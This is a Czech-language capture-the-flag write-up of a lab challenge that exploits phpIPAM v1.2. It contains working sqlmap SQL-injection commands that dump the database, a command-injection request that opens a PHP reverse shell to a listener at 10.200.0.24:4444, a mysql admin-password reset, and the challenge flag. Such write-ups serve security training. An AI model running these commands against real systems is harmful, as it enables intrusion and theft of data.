# Chapter 2: Origins (4)

## Zadání

Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

* The entry point to LORE is at <http://intro.lore.tcc>.

See you in the next incident!

## Nápovědy (Hints)

* Be sure you enter flag for correct chapter.

## Řešení

Webová stránka ze zadání obsahuje pouze odkazy na 4 úlohy ve skupině LORE.

Webová stránka pro tuto úlohu je <http://pimpam.lore.tcc/> na které běží `phpIPAM IP address management [v1.2]`, zdrojový kód je na [githubu](https://github.com/phpipam/phpipam/tree/v1.2.0).

Verze 1.2 obsahuje několik závažných bezpečnostních chyb umožňujících neautorizovanému uživateli SQL Injection a RCE (Remote Code Execution), viz <http://archive.justanotherhacker.com/2016/09/jahx163_-_phpipam_multiple_vulnerabilities.html>.

Zkusíme nejdříve SQL injection

`sqlmap -u http://pimpam.lore.tcc/app/tools/logs/show-logs.php --data "Notice=Notice&Warning=Warning&direction=next&lastId=1" --dbs`

Parametr `lastId` je zranitelný na SQL Injection a databáze se jmenuje pimpam.

Vyčteme celou databázi `pimpam`.

`sqlmap -u http://pimpam.lore.tcc/app/tools/logs/show-logs.php --data "Notice=Notice&Warning=Warning&direction=next&lastId=1" -D pimpam --dump`

Ve stažené databázi se FLAG nenachází a administrátorské heslo se nepodařilo slovníkovým útokem dekódovat.

Pro RCE použijeme `subnet-scan-telnet.php`, ze zdrojového kódu vyčteme, že jsou potřeba parametry `port` a `subnetId`.

`curl http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php --data "port=1&subnetId=1;sleep 5"`

Odpověď trvala delší dobu, takže to je důkaz, že se zavolal `sleep`.

Payload vygenerujeme na <https://www.revshells.com/> a použijeme php.

Spustíme poslouchání na portu 4444

`nc -vlnp 4444`

a zavoláme

`curl http://pimpam.lore.tcc/app/subnets/scan/subnet-update-icmp.php --data-urlencode 'subnetId=1;php -r '\''$sock=fsockopen("10.200.0.24",4444);exec("sh <&3 >&3 2>&3");'\'''`

Dojde ke spojení na náš počítač, příkazem `set` si zobrazíme proměnné prostředí ve kterých se skrývá hledaný FLAG.

PS: Administrátorské heslo do phpIPAM je možné změnit postupem zde <https://phpipam.net/news/reset-phpipam-admin-password/> a použitím klienta mysql. Nastavení hesla `ipamadmin`:

`mysql -h "$PIMPAM_DBHOST" -u "$PIMPAM_DBNAME" -p"$PIMPAM_DBPASS" pimpam -e 'update users set password = "$6$rounds=3000$JQEE6dL9NpvjeFs4$RK5X3oa28.Uzt/h5VAfdrsvlVe.7HgQUYKMXTJUsud8dmWfPzZQPbRbk8xJn1Kyyt4.dWm4nJIYhAV2mbOZ3g." where username = "Admin";'`

## Flag

`FLAG{V51j-9ETA-Swya-8cOR}`
